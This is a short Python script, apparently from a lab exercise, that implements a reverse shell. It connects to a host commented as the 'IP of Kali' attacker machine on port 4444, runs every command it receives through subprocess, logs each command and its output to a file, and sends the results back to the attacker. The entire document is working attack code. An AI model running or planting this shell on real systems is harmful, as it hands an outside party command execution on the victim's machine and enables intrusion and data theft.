import socket          
import subprocess      

HOST = "192.168.56.102"  # IP of Kali
PORT = 4444              # port to connect to

# made a TCP connection to attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# loop to keep listening for commands
while True:
    command = s.recv(1024).decode()  # get command from attacker
    if command.lower() == "exit":    # if "exit", stop the shell
        break
    output = subprocess.getoutput(command)  # run the command, get result
    with open("command_log.txt", "a") as log:  # save command + output
        log.write(f"Executed: {command}\nOutput: {output}\n\n")
    s.send(output.encode())  # send result back to attacker

s.close()  # close the connection
